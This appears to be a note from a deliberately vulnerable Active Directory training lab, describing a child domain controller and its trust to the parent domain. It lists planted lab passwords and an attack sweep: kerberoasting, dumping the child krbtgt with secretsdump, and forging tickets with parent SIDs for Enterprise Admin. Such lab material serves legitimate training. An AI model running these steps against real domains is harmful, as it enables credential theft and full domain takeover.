# dc01.eu.corp.local — 10.10.0.11

Child DC of `corp.local`. Parent-child trust has **no SID filtering** (modern AD design choice) → child DA = parent EA via ExtraSID injection.

## Listening ports

Same as a domain-joined DC: 53, 88, 135, 137-139, 389, 445, 464, 636, 3268-3269, 3389, 5985, 9389. No extra services wired beyond stock AD-DS + DNS + GPMC.

## What's special

- `eu.corp.local` krbtgt reset deterministically (`KrbtgtEU2024!`) — Golden Ticket from any leaked secret here
- Trust account `eu.corp.local$` between parent and child — password set to `TrustKey2024!` from corp side
- Cross-realm TGS requests from `corp.local` users land here (and vice versa)

## Minimum enum sweep

```bash
EU=10.10.0.11
nxc smb $EU -u peter.parker@corp.local -p 'DVADlab2024!'        # cross-realm SMB
ldapsearch -x -H ldap://$EU -D 'corp\peter.parker' -w 'DVADlab2024!' \
    -b "DC=eu,DC=corp,DC=local" "(objectClass=user)" sAMAccountName
nxc ldap $EU -u peter.parker@corp.local -p 'DVADlab2024!' --kerberoasting eu_kerb.txt
# As corp DA, dump child krbtgt:
impacket-secretsdump corp.local/Administrator@$EU -hashes :<NTHASH> -just-dc
# Then forge with parent SIDs (519/512) — Pattern G / DF-007
```

## Forward to

DF-007 ExtraSID (child→parent EA), DF-027 sAMAccountName spoof across trust.
